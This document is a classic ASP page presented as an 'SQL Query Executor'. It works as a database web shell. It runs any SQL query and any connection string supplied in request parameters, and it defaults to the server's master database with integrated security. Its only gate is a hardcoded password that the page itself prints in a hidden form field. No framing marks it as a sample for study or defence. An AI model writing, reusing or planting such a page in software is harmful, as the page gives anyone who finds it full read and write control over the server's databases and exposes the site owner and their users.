<%@ Language=VBScript %>
<%
Option Explicit
Response.Buffer = True
Response.Expires = -1

Dim p, connStr, q, con, cmd, rs, i, fld

p       = Request("p")
connStr = Request("c")
q       = Request("q")

' Default connection string agar empty ho
If connStr = "" Then connStr = "Server=.;Database=master;Integrated Security=True;"

' Password check
If p <> "secret_pass_123" Then
    Response.Write "Access denied."
    Response.End
End If

If q <> "" Then
    On Error Resume Next
    
    Set con = Server.CreateObject("ADODB.Connection")
    con.Open connStr
    
    If Err.Number <> 0 Then
        Response.Write "Connection Error: " & Server.HTMLEncode(Err.Description)
        Response.End
    End If
    
    Set cmd = Server.CreateObject("ADODB.Command")
    Set cmd.ActiveConnection = con
    cmd.CommandText = q
    cmd.CommandType = 1 ' adCmdText
    
    If UCase(Left(Trim(q), 6)) = "SELECT" Then
        ' SELECT query → results dikhana
        Set rs = cmd.Execute()
        
        If Not rs.EOF Then
            Do While Not rs.EOF
                For i = 0 To rs.Fields.Count - 1
                    Response.Write Server.HTMLEncode(rs(i).Value & "")
                    If i < rs.Fields.Count - 1 Then Response.Write " | "
                Next
                Response.Write "<br>" & vbCrLf
                rs.MoveNext
            Loop
        Else
            Response.Write "No records found."
        End If
        
        rs.Close
        Set rs = Nothing
    Else
        ' Non-SELECT → Execute karo
        cmd.Execute
        Response.Write "Query executed."
    End If
    
    con.Close
    Set cmd = Nothing
    Set con = Nothing
    
    If Err.Number <> 0 Then
        Response.Write "<br>Error: " & Server.HTMLEncode(Err.Description)
    End If
    
    On Error Goto 0
Else
%>
<!-- Query form agar koi query nahi di -->
<html>
<head>
<title>SQL Query Tool</title>
<style>
    body { font-family: Consolas, monospace; background:#f0f0f0; padding:20px; }
    textarea { font-family: Consolas; width:90%; }
</style>
</head>
<body>
<h3>SQL Query Executor</h3>

<form method="post">
    <b>Connection String:</b><br>
    <input type="text" name="c" value="<%=Server.HTMLEncode(connStr)%>" size="80"><br><br>
    
    <b>Query:</b><br>
    <textarea name="q" rows="8" cols="100"></textarea><br><br>
    
    <input type="hidden" name="p" value="secret_pass_123">
    <input type="submit" value="Execute Query">
</form>

<p><small>Note: Use with caution. Only SELECT shows output. Others execute silently.</small></p>
</body>
</html>
<%
End If
%>
